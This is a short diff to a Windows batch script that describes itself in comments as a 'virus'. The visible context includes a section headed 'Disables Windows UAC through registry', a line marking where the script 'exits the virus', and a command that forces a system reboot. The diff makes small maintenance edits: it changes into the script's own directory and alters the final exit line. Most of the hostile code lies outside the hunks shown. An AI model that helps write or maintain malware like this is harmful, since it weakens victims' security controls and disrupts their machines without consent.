@@ -31,6 +31,8 @@
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
+set sdir=%~dp0
+cd /d %sdir%
 : =========================================
 : Disables Windows UAC through registry
 : =========================================
@@ -90,4 +92,4 @@ ping -w 12 localhost >nul
 : exits the virus
 : ===============================================================
 wmic os where primary=true call reboot >nul
-exit
+exit /b 0
